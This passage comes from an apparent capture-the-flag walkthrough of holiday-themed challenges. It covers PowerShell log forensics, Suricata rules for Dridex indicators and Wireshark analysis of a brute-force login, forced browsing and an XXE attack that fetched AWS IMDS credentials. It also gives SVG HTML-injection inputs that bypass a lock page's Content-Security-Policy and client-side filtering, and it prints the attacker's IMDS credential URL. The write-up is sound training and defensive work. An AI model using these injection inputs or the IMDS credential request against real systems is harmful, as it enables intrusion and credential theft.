Recipe Question 3. The contents of the previous file were retrieved, changed, and stored to a variable by the attacker. This was done multiple times. Submit the last full PowerShell line that performed only these actions. Event Viewer grep Use the Find action to locate records containing the word 'Recipe'. Look through them until we find commands that assign a value to a variable, in this case, $foo. Now that we have the variable name, use Find to locate records that assign this variable (use the string '$foo ='), and locate the last one. Use the following command to find records including the word 'Recipe' grep Recipe powershell.evtx.log This will show that the varialbe being assigned is $foo. Use the following command to show all records that assign a value to this variable. grep '^$foo =' powershell.evtx.log Remember that this file is in reverse time order. Answer $foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} Question 4. After storing the altered file contents into the variable, the attacker used the variable to run a separate command that wrote the modified data to a file. This was done multiple times. Submit the last full PowerShell line that performed only this action. The most common way for PowerShell to write content to a file is with either the Out-File, Add-Content, or Set-Content commands, so search the log for instances where one of these commands are used with the variable. Event Viewer grep Modify the Find action to search just for '$foo' (since we are looking for any use of this variable). Find the last instance where this variable is used with one of the commands to write content to a file. Use the following grep command to display all uses of the variable $foo, and look for the first record (remember that they are in reverse time order) in the output that uses a PowerShell command to write to a file. grep '$foo' powershell.evtx.log Answer $foo | Add-Content -Path 'Recipe' Question 5. The attacker ran the previous command against a file multiple times. What is the name of this file? Event Viewer grep Use the Find action to search for the following string and make note of each file name written to and the number of times it was. $foo | Add-Content -Path Use the following grep command and examine the output for the file written to the most times. grep '$foo | Add-Content -Path' powershell.evtx.log Answer Recipe.txt Question 6. Were any files deleted? (Yes/No) Event Viewer grep Modify the filter being used to only show event ID 4104, then use the Find action to search for any instance of the following string. del Use the following grep command to see if there are any instances where the delete command is used grep '^del' powershell.evtx.log Answer yes Question 7. Was the original file (from question 2) deleted? (Yes/No) The result of the previous question will answer this one as well. Answer no Question 8. What is the Event ID of the log that shows the actual command line used to delete the file? Event Viewer grep If we've been using Event Viewer then we've been using this event ID throughout the objective. Modify the grep command used to determine if a file was deleted to show the preceding line, one of which will have the event ID. grep '^del' -B 1 powershell.evtx.log Answer 4104 Question 9. Is the secret ingredient compromised (Yes/No)? Refer to the answer to Question 3 Answer yes Question 10. What is the secret ingredient? Refer to the answer to Question 3 Answer honey","title":"Solution"},{"location":"quests/Recover_the_Tolkien_Ring/03_Windows_Event_Logs/#completion","text":"Talk to Dusty Giftwrap to receive hints for the next objective Say, you did it! Thanks a million! Now we can mix in the proper ingredients and stop attracting the Snowrog! I'm all set now! Can you help Fitzy over there wield the exalted Suricata? It can be a bit mystifying at first, but this Suricata Tome should help you fathom it. I sure hope you can make it work!","title":"Completion"},{"location":"quests/Recover_the_Tolkien_Ring/04_Suricata_Regatta/","text":"Suricata Regatta Suricata Regatta Difficulty : Help detect this kind of malicous activity in the future by writing some Suricata rules. Work with Dusty Giftwrap in the Tolkien Ring to get some hints. Elf Introduction Talk to Fitzy Shortstack Hm?.. Hello... Sorry, I don't mean to be uncharaceristically short with you. There's just this abominable Snowrog here, and I'm trying to comprehend Suricata to stop it from getting into the kitchen. I believe that if I can phrase these Suricata incantations correctly, they'll create a spell that will generate warnings. And hopefully those warnings will scare off the Snowrog! Only... I'm quite baffled. Maybe you can give it a go? Hints and Resources Hints from Dusty Giftwrap after completion of the Windows Event Logs objective The Tome of Suricata Rules This is the official source for Suricata rule creation! Solution Open the terminal next to Fitzy Shortstack. For this challenge you must add 4 rules to the suricata.rules file meeting the criteria specified. After each rule has been added, run ./rule_checker to confirm your answer. All rules will use alert as their action. Since every rule needs a unique SID value we will number the rules 1-4, though these values could be anything. Rule 1: First, please create a Suricata rule to catch DNS lookups for adv.epostoday.uk. Whenever there's a match, the alert message (msg) should read \"Known bad DNS lookup, possible Dridex infection\". This rule will apply to packets using the DNS protocol that originate from any source and go to any destination. A destination port is not strictly necessary but as all DNS traffic will go to port 53 including the destination port makes the rule more specific. DNS keywords will be added (see https://suricata.readthedocs.io/en/suricata-6.0.0/rules/dns-keywords.html ) to apply the rule to DNS lookups for the specific domain in question. Answer alert dns any any -> any 53 (msg:\"Known bad DNS lookup, possible Dridex infection\"; dns.query; content:\"adv.epostoday.uk\"; sid:1;) Rule 2: Develop a Suricata rule that alerts whenever the infected IP address 192.185.57.242 communicates with internal systems over HTTP. When there's a match, the message (msg) should read \"Investigate suspicious connections, possible Dridex infection\" This rule will apply to packets using the HTTP protocol going to or coming from from the infected IP address. Answer alert http any any <> [192.185.57.242/32] 80 (msg:\"Investigate suspicious connections, possible Dridex infection\"; sid:2;) Develop a Suricata rule to match and alert on an SSL certificate for heardbellith.Icanwepeh.nagoya. When your rule matches, the message (msg) should read \"Investigate bad certificates, possible Dridex infection\" This rule will apply to packets using the TLS protocol with any source / destination combination. TLS keywords will be added (see https://suricata.readthedocs.io/en/suricata-6.0.0/rules/tls-keywords.html ) to apply the rule to certificates matching the specified subject. Answer alert tls any any -> any any (msg:\"Investigate bad certificates, possible Dridex infection\"; tls.cert_subject; content:\"CN=heardbellith.Icanwepeh.nagoya\"; sid:3;) Let's watch for one line from the JavaScript: let byteCharacters = atob Oh, and that string might be GZip compressed - I hope that's OK! Just in case they try this again, please alert on that HTTP data with message Suspicious JavaScript function, possible Dridex infection This rule will apply to packets using the HTTP protocol with any source / destination combination. Additional HTTP keywords will be added (see https://suricata.readthedocs.io/en/suricata-6.0.0/rules/http-keywords.html ) to apply the rule to packets that include the specified content. Answer alert http any any -> any any (msg:\"Suspicious JavaScript function, possible Dridex infection\"; file_data; content:\"let byteCharacters = atob\"; sid:4;) Completion Talk to Fitzy Shortstack Woo hoo - you wielded Suricata magnificently! Thank you! Now to shout the final warning of power to the Snowrog... YOU...SHALL NOT...PASS!!!","title":"Suricata Regatta"},{"location":"quests/Recover_the_Tolkien_Ring/04_Suricata_Regatta/#suricata-regatta","text":"Suricata Regatta Difficulty : Help detect this kind of malicous activity in the future by writing some Suricata rules. Work with Dusty Giftwrap in the Tolkien Ring to get some hints.","title":"Suricata Regatta"},{"location":"quests/Recover_the_Tolkien_Ring/04_Suricata_Regatta/#elf-introduction","text":"Talk to Fitzy Shortstack Hm?.. Hello... Sorry, I don't mean to be uncharaceristically short with you. There's just this abominable Snowrog here, and I'm trying to comprehend Suricata to stop it from getting into the kitchen. I believe that if I can phrase these Suricata incantations correctly, they'll create a spell that will generate warnings. And hopefully those warnings will scare off the Snowrog! Only... I'm quite baffled. Maybe you can give it a go?","title":"Elf Introduction"},{"location":"quests/Recover_the_Tolkien_Ring/04_Suricata_Regatta/#hints-and-resources","text":"Hints from Dusty Giftwrap after completion of the Windows Event Logs objective The Tome of Suricata Rules This is the official source for Suricata rule creation!","title":"Hints and Resources"},{"location":"quests/Recover_the_Tolkien_Ring/04_Suricata_Regatta/#solution","text":"Open the terminal next to Fitzy Shortstack. For this challenge you must add 4 rules to the suricata.rules file meeting the criteria specified. After each rule has been added, run ./rule_checker to confirm your answer. All rules will use alert as their action. Since every rule needs a unique SID value we will number the rules 1-4, though these values could be anything. Rule 1: First, please create a Suricata rule to catch DNS lookups for adv.epostoday.uk. Whenever there's a match, the alert message (msg) should read \"Known bad DNS lookup, possible Dridex infection\". This rule will apply to packets using the DNS protocol that originate from any source and go to any destination. A destination port is not strictly necessary but as all DNS traffic will go to port 53 including the destination port makes the rule more specific. DNS keywords will be added (see https://suricata.readthedocs.io/en/suricata-6.0.0/rules/dns-keywords.html ) to apply the rule to DNS lookups for the specific domain in question. Answer alert dns any any -> any 53 (msg:\"Known bad DNS lookup, possible Dridex infection\"; dns.query; content:\"adv.epostoday.uk\"; sid:1;) Rule 2: Develop a Suricata rule that alerts whenever the infected IP address 192.185.57.242 communicates with internal systems over HTTP. When there's a match, the message (msg) should read \"Investigate suspicious connections, possible Dridex infection\" This rule will apply to packets using the HTTP protocol going to or coming from from the infected IP address. Answer alert http any any <> [192.185.57.242/32] 80 (msg:\"Investigate suspicious connections, possible Dridex infection\"; sid:2;) Develop a Suricata rule to match and alert on an SSL certificate for heardbellith.Icanwepeh.nagoya. When your rule matches, the message (msg) should read \"Investigate bad certificates, possible Dridex infection\" This rule will apply to packets using the TLS protocol with any source / destination combination. TLS keywords will be added (see https://suricata.readthedocs.io/en/suricata-6.0.0/rules/tls-keywords.html ) to apply the rule to certificates matching the specified subject. Answer alert tls any any -> any any (msg:\"Investigate bad certificates, possible Dridex infection\"; tls.cert_subject; content:\"CN=heardbellith.Icanwepeh.nagoya\"; sid:3;) Let's watch for one line from the JavaScript: let byteCharacters = atob Oh, and that string might be GZip compressed - I hope that's OK! Just in case they try this again, please alert on that HTTP data with message Suspicious JavaScript function, possible Dridex infection This rule will apply to packets using the HTTP protocol with any source / destination combination. Additional HTTP keywords will be added (see https://suricata.readthedocs.io/en/suricata-6.0.0/rules/http-keywords.html ) to apply the rule to packets that include the specified content. Answer alert http any any -> any any (msg:\"Suspicious JavaScript function, possible Dridex infection\"; file_data; content:\"let byteCharacters = atob\"; sid:4;)","title":"Solution"},{"location":"quests/Recover_the_Tolkien_Ring/04_Suricata_Regatta/#completion","text":"Talk to Fitzy Shortstack Woo hoo - you wielded Suricata magnificently! Thank you! Now to shout the final warning of power to the Snowrog... YOU...SHALL NOT...PASS!!!","title":"Completion"},{"location":"quests/Recover_the_Web_Ring/","text":"Recover the Web Ring This quest line takes place on the fourth level of the subterranean labyrinth and consists of 6 objectives. Note that the first 4 objectives in your badge are are completed as a group that earns the 'Boria PCAP Mining' achievement. Boria PCAP Mining Naughty IP Credential Mining 404 FTW IDMS, XXE, and Other Abbreviations Open the Boria Mine Door Glamtariel's Fountain","title":"Recover the Web Ring"},{"location":"quests/Recover_the_Web_Ring/#recover-the-web-ring","text":"This quest line takes place on the fourth level of the subterranean labyrinth and consists of 6 objectives. Note that the first 4 objectives in your badge are are completed as a group that earns the 'Boria PCAP Mining' achievement. Boria PCAP Mining Naughty IP Credential Mining 404 FTW IDMS, XXE, and Other Abbreviations Open the Boria Mine Door Glamtariel's Fountain","title":"Recover the Web Ring"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/","text":"Boria PCAP Mining This segment of the Web Ring quest consists of 4 separate objectives tracked in your badge. Other resources Wireshark https://www.wireshark.org/#download Naughty IP Naughty IP Difficulty : Use the artifacts from Alabaster Snowball to analyze this attack on the Boria mines. Most of the traffic to this site is nice, but one IP address is being naughty! Which is it? Visit Sparkle Redberry in the Tolkien Ring for hints. Elf Introduction Alabaster Snowball Hey there! I'm Alabaster Snowball And I have to say, I'm a bit distressed. I was working with the dwarves and their Boria mines, and I found some disturbing activity! Looking through these artifacts , I think something naughty's going on. Can you please take a look and answer a few questions for me? First, we need to know where the attacker is coming from. If you haven't looked at Wireshark's Statistics menu, this might be a good time! Hints and Resources Hint after speaking with Alabaster Wireshark Top Talkers The victim web server is 10.12.42.16. Which host is the next top talker ? Other resources Wireshark https://www.wireshark.org/#download Solution Download the artifacts zip file that you get from either Alabaster or your badge objective. Contained in it are two files, victim.pcap and weberror.log . Alabaster hints that we should look at the statistics menu in Wireshark to determine where the attacker is coming from. Open the pcap file in Wireshark and go to Statistics > Conversations. Select the IPv4 tab and sort the list by the number of packets sent. From this we can see that one address in particular has sent an abnormal number of packets to our web server. Answer 18.222.86.32 Completion Alabaster Snowball Aha, you found the naughty actor! Next, please look into the account brute force attack. You can focus on requests to /login.html Credential Mining Credential Mining Difficulty : The first attack is a brute force login. What's the first username tried? Hints and Resources Hint from Alabaster after completion of Naughty IP Wireshark String Searching The site's login function is at /login.html . Maybe start by searching for a string. Solution For this challenge we need to identify the first username attempted in the brute force attack. As Alabaster mentions, the username would be submitted to the /login.html page. The hint from Alabaster suggests that we use the Find Packet feature of Wireshark to search for packets containing a reference to the login page. However, this requires us to sift through a large number of packets looking for the right one, which might be easy to miss. A better solution is to recognize that any login attempts will likely involve a POST request to the login.html page. The following Wireshark filter will limit our view to just post requests originating from the naughty IP we identified earlier. ip.addr == 18.222.86.32 and http.request.method == POST Inspecting the HTML form items in the first packet's details gives us the answer. Answer alice Completion Alabaster Snowball Alice? I totally expected Eve! Well how about forced browsing? What's the first URL path they found that way? The misses will have HTTP status code 404 and, in this case, the successful guesses return 200. 404 FTW 404 FTW Difficulty : The next attack is forced browsing where the naughty one is guessing URLs. What's the first successful URL path in this attack? Hints and Resources Hint from Alabaster after completing Credential Mining HTTP Status Codes With forced browsing, there will be many 404 status codes returned from the web server. Look for 200 codes in that group of 404s. This one can be completed with the PCAP or the log file. Solution Identifying the first URL found by a brute force attack requires us to first find a large number of GET requests resulting in HTTP status code 404, and then following those until we identify one that returns status code 200. This can be performed either in Wireshark or by using the supplied weberror.log file. Wireshark Method weberror.log File Method For this objective we are only interested in HTTP status codes, which we can create a filter for. Since we want to find the first 200 code that will be accompanied by a large number of 404 codes we need to include both of them, and as before, we will limit our investigation to the naughty IP with the following Wireshark filter. ip.addr == 18.222.86.32 and (http.response.code == 404 or http.response.code == 200) After applying this filter we can scroll through the resulting list looking for the flurry of 404 statuses. Then it's just a matter of looking through that list to find the first instance of code 200, then inspecting the request URI in the packet details. This log file contains all requests to the web server along with their resulting status codes. This includes successful requests as well, so the 'error' in the filename is a bit misleading. We can extract from this file all the requests sent by the naughty IP using either grep on a Linux machine or Powershell on Windows. $ grep 18.222.86.32 weberror.log > attacker.log PS> cat weberror.log | select-string '18.222.86.32' > attacker.log After this, open the attacker.log file in a a text editor and search for the first instance of the string 404 (note the spaces around the status code). After finding it, search now for the next instance of 200 , to find the first successful request. Answer /proc Completion Alabaster Snowball Great! Just one more challenge! It looks like they made the server pull credentials from IMDS. What URL was forced? AWS uses a specific IP address for IMDS lookups. Searching for that in the PCAP should get you there quickly. IMDS, XXE, and Other Abbreviations IMDS, XXE, and Other Abbreviations Difficulty : The last step in this attack was to use XXE to get secret keys from the IMDS service. What URL did the attacker force the server to fetch? Hints and Resources Hint from Alabster after completing 404 FTW Instance Metadata Service AWS uses a specific IP address to access IMDS , and that IP only appears twice in this PCAP. Solution For this challenge we need to find the IDMS URL that was accessed. IDMS always uses the IP address 169.254.169.254, so we can use the Find Packet feature in Wireshark to find any packets containing that address in the packet details. We still want to limit our investigation to the naughty IP, otherwise we may catch legitimate use of IMDS, so setup the display filter as we have before. `ip.addr == 18.222.86.32' Then, open the Find Packet toolbar and search for the string 169.254.169.254 . Make sure that the search is setup to search on Packet details. Use of this IP will be in a POST request to a vulnerable URL. For each one found (the hint for this challenge says that this IP appears two times, but it actually appears four times) look at the HTTP status 200 packet following it. The one that returned data to the attacker will have interesting things in the packet data. Answer http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance Completion Alabaster Snowball Fantastic! It seems simpler now that I've seen it once. Thanks for showing me! Hey, so maybe I can help you out a bit with the door to the mines. First, it'd be great to bring an Elvish keyboard, but if you can't find one, I'm sure other input will do. Instead, take a minute to read the HTML/JavaScript source and consider how the locks are processed. Next, take a look at the Content-Security-Policy header. That drives how certain content is handled. Lastly, remember that input sanitization might happen on either the client or server ends!","title":"Boria PCAP Mining"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#boria-pcap-mining","text":"This segment of the Web Ring quest consists of 4 separate objectives tracked in your badge. Other resources Wireshark https://www.wireshark.org/#download","title":"Boria PCAP Mining"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#naughty-ip","text":"Naughty IP Difficulty : Use the artifacts from Alabaster Snowball to analyze this attack on the Boria mines. Most of the traffic to this site is nice, but one IP address is being naughty! Which is it? Visit Sparkle Redberry in the Tolkien Ring for hints.","title":"Naughty IP"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#elf-introduction","text":"Alabaster Snowball Hey there! I'm Alabaster Snowball And I have to say, I'm a bit distressed. I was working with the dwarves and their Boria mines, and I found some disturbing activity! Looking through these artifacts , I think something naughty's going on. Can you please take a look and answer a few questions for me? First, we need to know where the attacker is coming from. If you haven't looked at Wireshark's Statistics menu, this might be a good time!","title":"Elf Introduction"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#hints-and-resources","text":"Hint after speaking with Alabaster Wireshark Top Talkers The victim web server is 10.12.42.16. Which host is the next top talker ? Other resources Wireshark https://www.wireshark.org/#download","title":"Hints and Resources"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#solution","text":"Download the artifacts zip file that you get from either Alabaster or your badge objective. Contained in it are two files, victim.pcap and weberror.log . Alabaster hints that we should look at the statistics menu in Wireshark to determine where the attacker is coming from. Open the pcap file in Wireshark and go to Statistics > Conversations. Select the IPv4 tab and sort the list by the number of packets sent. From this we can see that one address in particular has sent an abnormal number of packets to our web server. Answer 18.222.86.32","title":"Solution"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#completion","text":"Alabaster Snowball Aha, you found the naughty actor! Next, please look into the account brute force attack. You can focus on requests to /login.html","title":"Completion"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#credential-mining","text":"Credential Mining Difficulty : The first attack is a brute force login. What's the first username tried?","title":"Credential Mining"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#hints-and-resources_1","text":"Hint from Alabaster after completion of Naughty IP Wireshark String Searching The site's login function is at /login.html . Maybe start by searching for a string.","title":"Hints and Resources"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#solution_1","text":"For this challenge we need to identify the first username attempted in the brute force attack. As Alabaster mentions, the username would be submitted to the /login.html page. The hint from Alabaster suggests that we use the Find Packet feature of Wireshark to search for packets containing a reference to the login page. However, this requires us to sift through a large number of packets looking for the right one, which might be easy to miss. A better solution is to recognize that any login attempts will likely involve a POST request to the login.html page. The following Wireshark filter will limit our view to just post requests originating from the naughty IP we identified earlier. ip.addr == 18.222.86.32 and http.request.method == POST Inspecting the HTML form items in the first packet's details gives us the answer. Answer alice","title":"Solution"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#completion_1","text":"Alabaster Snowball Alice? I totally expected Eve! Well how about forced browsing? What's the first URL path they found that way? The misses will have HTTP status code 404 and, in this case, the successful guesses return 200.","title":"Completion"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#404-ftw","text":"404 FTW Difficulty : The next attack is forced browsing where the naughty one is guessing URLs. What's the first successful URL path in this attack?","title":"404 FTW"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#hints-and-resources_2","text":"Hint from Alabaster after completing Credential Mining HTTP Status Codes With forced browsing, there will be many 404 status codes returned from the web server. Look for 200 codes in that group of 404s. This one can be completed with the PCAP or the log file.","title":"Hints and Resources"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#solution_2","text":"Identifying the first URL found by a brute force attack requires us to first find a large number of GET requests resulting in HTTP status code 404, and then following those until we identify one that returns status code 200. This can be performed either in Wireshark or by using the supplied weberror.log file. Wireshark Method weberror.log File Method For this objective we are only interested in HTTP status codes, which we can create a filter for. Since we want to find the first 200 code that will be accompanied by a large number of 404 codes we need to include both of them, and as before, we will limit our investigation to the naughty IP with the following Wireshark filter. ip.addr == 18.222.86.32 and (http.response.code == 404 or http.response.code == 200) After applying this filter we can scroll through the resulting list looking for the flurry of 404 statuses. Then it's just a matter of looking through that list to find the first instance of code 200, then inspecting the request URI in the packet details. This log file contains all requests to the web server along with their resulting status codes. This includes successful requests as well, so the 'error' in the filename is a bit misleading. We can extract from this file all the requests sent by the naughty IP using either grep on a Linux machine or Powershell on Windows. $ grep 18.222.86.32 weberror.log > attacker.log PS> cat weberror.log | select-string '18.222.86.32' > attacker.log After this, open the attacker.log file in a a text editor and search for the first instance of the string 404 (note the spaces around the status code). After finding it, search now for the next instance of 200 , to find the first successful request. Answer /proc","title":"Solution"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#completion_2","text":"Alabaster Snowball Great! Just one more challenge! It looks like they made the server pull credentials from IMDS. What URL was forced? AWS uses a specific IP address for IMDS lookups. Searching for that in the PCAP should get you there quickly.","title":"Completion"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#imds-xxe-and-other-abbreviations","text":"IMDS, XXE, and Other Abbreviations Difficulty : The last step in this attack was to use XXE to get secret keys from the IMDS service. What URL did the attacker force the server to fetch?","title":"IMDS, XXE, and Other Abbreviations"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#hints-and-resources_3","text":"Hint from Alabster after completing 404 FTW Instance Metadata Service AWS uses a specific IP address to access IMDS , and that IP only appears twice in this PCAP.","title":"Hints and Resources"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#solution_3","text":"For this challenge we need to find the IDMS URL that was accessed. IDMS always uses the IP address 169.254.169.254, so we can use the Find Packet feature in Wireshark to find any packets containing that address in the packet details. We still want to limit our investigation to the naughty IP, otherwise we may catch legitimate use of IMDS, so setup the display filter as we have before. `ip.addr == 18.222.86.32' Then, open the Find Packet toolbar and search for the string 169.254.169.254 . Make sure that the search is setup to search on Packet details. Use of this IP will be in a POST request to a vulnerable URL. For each one found (the hint for this challenge says that this IP appears two times, but it actually appears four times) look at the HTTP status 200 packet following it. The one that returned data to the attacker will have interesting things in the packet data. Answer http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance","title":"Solution"},{"location":"quests/Recover_the_Web_Ring/08_Boria_PCAP_Mining/#completion_3","text":"Alabaster Snowball Fantastic! It seems simpler now that I've seen it once. Thanks for showing me! Hey, so maybe I can help you out a bit with the door to the mines. First, it'd be great to bring an Elvish keyboard, but if you can't find one, I'm sure other input will do. Instead, take a minute to read the HTML/JavaScript source and consider how the locks are processed. Next, take a look at the Content-Security-Policy header. That drives how certain content is handled. Lastly, remember that input sanitization might happen on either the client or server ends!","title":"Completion"},{"location":"quests/Recover_the_Web_Ring/09_Open_the_Boria_Mine_Door/","text":"Open the Boria Mine Door Open Boria Mine Door Difficulty : Open the door to the Boria Mines. Help Alabaster Snowball in the Web Ring to get some hints for this challenge. Elf Introduction Hal Tandybuck Oh hi, I'm Hal Tandybuck. And who might you be? I'm hanging out by the door to the mines here because, well, I haven't figured out the locks yet. It actually reminds me of this locked crate I had three years ago... I doubt we'll get much in the way of debug output. Think you can help me get through? Hints and Resources Hints received from Alabaster Snowball after completing Boria PCAP Mining Lock Mechanism The locks take input, render some type of image, and process on the back end to unlock. To start, take a good look at the source HTML/JavaScript. Content Security-Policy Understanding how Content-Security-Policy works can help with this challenge. Input Validation Developers use both client- and server-side input validation to keep out naughty input. Other resources HTML SVG Graphics https://www.w3schools.com/html/html5_svg.asp Burp Suite Community Edition https://portswigger.net/burp/communitydownload Solution Opening the terminal next to Hal Tandybuck presents us with an instruction page telling us that we need to somehow connect the sensors for each pin using appropriate characters, then we are presented with 6 pins, the first 3 of which need to be opened in order to complete the challenge. Alabaster's first hint suggests that we inspect the source HTML / JavaScript, so either proxy the traffic through Burp Suite or open the browser Developer Tools and reload the page. Search the network traffic for requests for the URLs /pin1 - /pin6 and inspect the response to get the HTML source. Pin 1 The HTML source for the first pin is relatively straightforward, and provides us with an answer to solve the first one. Pin1 HTML 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < meta http-equiv = \"X-UA-Compatible\" content = \"IE=edge\" > < meta name = \"viewport\" content = \"width=device-width, initial-scale=1.0\" > < title > Lock 1 </ title > < link rel = \"stylesheet\" href = \"pin.css\" > </ head > < body > < form method = 'post' action = 'pin1' > <!-- @&@&&W&&W&&&& --> < input class = 'inputTxt' name = 'inputTxt' type = 'text' value = '' autocomplete = 'off' /> < button > GO </ button > </ form > < div class = 'output' ></ div > < img class = 'captured' /> <!-- js --> < script src = 'pin.js' ></ script > </ body > </ html > Here we see in the comment a character string that when entered into the pin will complete the circuit. Pin 1 Answer @&@&&W&&W&&&& At this point some experimentation is necessary to figure out what is going on. As it turns out, this is not the only way to open the first pin. Whatever characters you enter will be rendered as an HTML image, and so long as the characters touch in such a way that a path is created between the two pins the pin will open. Pin 1 Alternate Answer AAAAAAAAAAAAA Pin 2 The code for pin2 is identical to pin1, but adds a Content-Security-Policy. This policy will disallow the loading of styles or scripts from anywhere but the same site that the page is loading from, but will allow inline scripts. Pin2 HTML 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < meta http-equiv = \"X-UA-Compatible\" content = \"IE=edge\" > < meta name = \"viewport\" content = \"width=device-width, initial-scale=1.0\" > < meta http-equiv = \"Content-Security-Policy\" content = \"default-src 'self';script-src 'self';style-src 'self' 'unsafe-inline'\" > < title > Lock 2 </ title > < link rel = \"stylesheet\" href = \"pin.css\" > </ head > < body > < form method = 'post' action = 'pin2' > <!-- TODO: FILTER OUT HTML FROM USER INPUT --> < input class = 'inputTxt' name = 'inputTxt' type = 'text' value = '' autocomplete = 'off' /> < button > GO </ button > </ form > < div class = 'output' ></ div > < img class = 'captured' /> <!-- js --> < script src = 'pin.js' ></ script > </ body > </ html > Now we just need to figure out a way to input something that when rendered into an HTML image will connect the lines. We could perhaps load an image from an external source, but an easier method is to generate an image using an HTML SVG (Scalable Vector Graphics) element. Inspecting the results from our first pin in Developer Tools we see that it created an image that is 200 x 170 pixels in size. So if we create a white square of this size using SVC it will complete the second pin. Pin 2 Answer <svg width=\"200\" height=\"170\"><rect width=\"100%\" height=\"100%\" fill=\"white\" /></svg> Pin 3 The only change in the source for Pin 3 removes the default-src 'self' directive from the Content-Security-Policy Pin 3 HTML 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < meta http-equiv = \"X-UA-Compatible\" content = \"IE=edge\" > < meta name = \"viewport\" content = \"width=device-width, initial-scale=1.0\" > < meta http-equiv = \"Content-Security-Policy\" content = \"script-src 'self' 'unsafe-inline'; style-src 'self'\" > <!-- <meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; img-src https://*; child-src 'none';\"> --> < title > Lock 3 </ title > < link rel = \"stylesheet\" href = \"pin.css\" > </ head > < body > < form method = 'post' action = 'pin3' > <!-- TODO: FILTER OUT JAVASCRIPT FROM USER INPUT --> < input class = 'inputTxt' name = 'inputTxt' type = 'text' value = '' autocomplete = 'off' /> < button > GO </ button > </ form > < div class = 'output' ></ div > < img class = 'captured' /> <!-- js --> < script src = 'pin.js' ></ script > </ body > </ html > However, this doesn't affect the method that we used for Pin 2, so we can use the same code for Pin 3, noting however that this time the circuit ends are blue. Pin 3 Answer <svg width=\"200\" height=\"170\"><rect width=\"100%\" height=\"100%\" fill=\"blue\" /></svg> Part 1 Completion Hal Tandybuck Great! Thanks so much for your help! When you get to the fountain inside, there are some things you should consider. First, it might be helpful to focus on Glamtariel's CAPITALIZED words. If you finish those locks, I might just have another hint for you! Pins 4-5 Pins 4-6 get a little more complicated. * Pin 4 includes a sanitization script that will disallow the use of the characters \" , ' , < , or > * Pin 5 has the same sanitization script as Pin 4, but also has a Content-Security-Policy * Pin 6 has only a policy, presumably performing the sanitization on the server Pin 4 HTML 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < meta http-equiv = \"X-UA-Compatible\" content = \"IE=edge\" > < meta name = \"viewport\" content = \"width=device-width, initial-scale=1.0\" > < title > Lock 4 </ title > < link rel = \"stylesheet\" href = \"pin.css\" > < script > const sanitizeInput = () => { const input = document . querySelector ( '.inputTxt' ); const content = input . value ; input . value = content . replace ( /\"/ , '' ) . replace ( /'/ , '' ) . replace ( /</ , '' ) . replace ( />/ , '' ); } </ script > </ head > < body > < form method = 'post' action = 'pin4' > < input class = 'inputTxt' name = 'inputTxt' type = 'text' value = '' autocomplete = 'off' onblur = 'sanitizeInput()' /> < button > GO </ button > </ form > < div class = 'output' ></ div > < img class = 'captured' /> <!-- js --> < script src = 'pin.js' ></ script > </ body > </ html > Pin 5 HTML 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < meta http-equiv = \"X-UA-Compatible\" content = \"IE=edge\" > < meta name = \"viewport\" content = \"width=device-width, initial-scale=1.0\" > < meta http-equiv = \"Content-Security-Policy\" content = \"script-src 'self' 'unsafe-inline'; style-src 'self'\" > < title > Lock 5 </ title > < link rel = \"stylesheet\" href = \"pin.css\" > < script > const sanitizeInput = () => { const input = document . querySelector ( '.inputTxt' ); const content = input . value ; input . value = content . replace ( /\"/gi , '' ) . replace ( /'/gi , '' ) . replace ( /</gi , '' ) . replace ( />/gi , '' ); } </ script > </ head > < body > < form method = 'post' action = 'pin5' > < input class = 'inputTxt' name = 'inputTxt' type = 'text' value = '' autocomplete = 'off' onblur = 'sanitizeInput()' /> < button > GO </ button > </ form > < div class = 'output' ></ div > < img class = 'captured' /> <!-- js --> < script src = 'pin.js' ></ script > </ body > </ html > Pin 6 HTML 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < meta http-equiv = \"X-UA-Compatible\" content = \"IE=edge\" > < meta name = \"viewport\" content = \"width=device-width, initial-scale=1.0\" > < meta http-equiv = \"Content-Security-Policy\" content = \"script-src 'self'; style-src 'self'\" > < title > Lock 6 </ title > < link rel = \"stylesheet\" href = 